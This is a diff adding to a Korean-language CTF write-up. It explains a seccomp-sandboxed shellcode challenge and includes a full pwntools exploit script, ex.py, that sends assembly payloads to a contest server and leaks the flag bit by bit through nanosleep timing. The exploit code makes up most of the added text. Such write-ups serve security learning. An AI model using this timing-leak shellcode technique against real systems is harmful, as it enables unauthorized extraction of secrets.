@@ -389,3 +389,104 @@ int main(int argc, char* argv[]){
 `flag`가 `bss` 영역에 저장되어 있다. `sandbox`에서의 `seccomp` 설정으로 `nanosleep` 함수만 허용하고 있다. 그 후 `stub`에 저장된 쉘코드를 실행한 후 유저가 입력한 쉘 코드를 입력한다. `stub`에 저장된 쉘코드는 `rsp, rip`를 제외한 모든 레지스터를 0으로 초기화한다.
 `flag`를 얻기 위해 두 가지 작업을 해야 한다. 첫 번째는 `flag`가 저장된 주소를 찾는 것이다. `*($rsp)`가 `code` 영역 주소이므로 `bss` 영역의 시작 주소를 얻을 수 있다. 그로부터 조금 넉넉하게 여유를 두어 약간 앞으로 주소를 잡고 브루트포싱으로 `c` 글자를 탐색한다. 탐색 방법은 `time based sql injection`과 같은 논리이다. 해당 메모리에 `c`가 저장되어 있으면 2초 `sleep`을 하고, 아니라면 바로 종료한다.
 두 번째는 `flag`를 읽는 것이다. 이를 위해 두 가지 방법을 생각했다. 가장 처음 생각한 건 8바이트씩 끊어서 이분탐색을 하는 것이었는데, 물론 굉장히 빠르겠지만 이분 탐색 코드 짜기가 귀찮았다. 그래서 그냥 1비트씩 확인하는 코드로 짰다. 이 코드는 30분 정도 걸렸다. 대회 끝나고 짠 이분탐색 코드도 함께 첨부하겠다.
+
+### ex.py
+
+```python
+from pwn import *
+from datetime import datetime
+
+binary = './prob'
+ 
+context.binary = binary
+context.arch = 'amd64'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+"""
+for i in range(0x1000):
+    try:   
+        #p = process(binary)
+        #gdb.attach(p)
+        p = remote('3.38.198.197', 54321)
+        offset = 0x4000 - 0x1572 + i
+        payload = f'''
+            pop r10
+            add r10, {offset}
+            mov al, byte ptr [r10]
+            cmp al, 99
+            jne skip_sleep
+
+            push 0
+            push 2
+            mov rdi, rsp
+            mov rax, 35
+            syscall
+
+        skip_sleep:
+            mov rax, 60
+            mov rdi, 0
+            syscall
+        '''
+        p.sendafter(b': ', asm(payload))
+        start = datetime.now()
+        p.recvline()
+        p.recvline()
+    except:
+        end = datetime.now()
+        p.close()
+    t = (end-start).total_seconds()
+    print(hex(i), t)
+    if t > 1.5 : 
+        print(hex(i))
+        print(offset)
+        exit()
+""" # 0x2e
+
+flag = ""
+k = 0
+
+for i in range(400):
+    try:   
+        #p = process(binary)
+        p = remote('3.38.198.197', 54321)
+        offset = 0x4000 - 0x1572 + 0x2e
+        payload = f'''
+            pop r10
+            add r10, {offset}
+            add r10, {i // 8}
+            mov al, byte ptr [r10]
+            shr al, {i % 8}
+
+            and al, 1
+            cmp al, 1
+            jne skip_sleep
+
+            push 0
+            push 2
+            mov rdi, rsp
+            mov rax, 35
+            syscall
+
+        skip_sleep:
+            mov rax, 60
+            mov rdi, 0
+            syscall
+        '''
+        p.sendafter(b': ', asm(payload))
+        start = datetime.now()
+        p.recvline()
+        p.recvline()
+    except:
+        end = datetime.now()
+        p.close()
+    t = (end-start).total_seconds()
+    if t > 1.5 : 
+        k += 1 << (i % 8)
+    if (i % 8) == 7:
+        flag += chr(k)
+        k = 0
+        print(flag)
+        if chr(k) == '}' : exit(0)
+
+```
